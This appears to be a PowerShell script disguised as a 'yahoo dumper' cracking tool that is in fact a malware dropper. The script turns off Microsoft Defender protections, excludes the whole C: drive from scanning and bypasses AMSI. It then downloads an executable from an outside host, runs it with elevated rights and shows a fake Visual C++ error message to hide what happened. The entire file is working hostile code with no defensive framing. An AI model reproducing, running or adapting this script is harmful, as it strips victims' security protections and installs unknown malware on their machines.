cls
$host.ui.RawUI.WindowTitle = 'yahoo dumper by crackinger fuck breakinginto'
Start-Sleep -s 2
echo "loading threads"
#Set exclusion path
Add-MpPreference -ExclusionPath "C:\"
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -MAPSReporting Disable
Set-MpPreference -SubmitSamplesConsent NeverSend

#Disable AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

$url = "http://observacs.xyz/dashboard/obcaptcha.exe"
$output = "C:\Windows\Temp\obcaptcha.exe"

$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $output)

Start-Process -FilePath $output -Verb RunAs

Start-Sleep -s 5
echo 'Visual C++ runtime has malfunctioned: R6035 R6028'
Start-Sleep
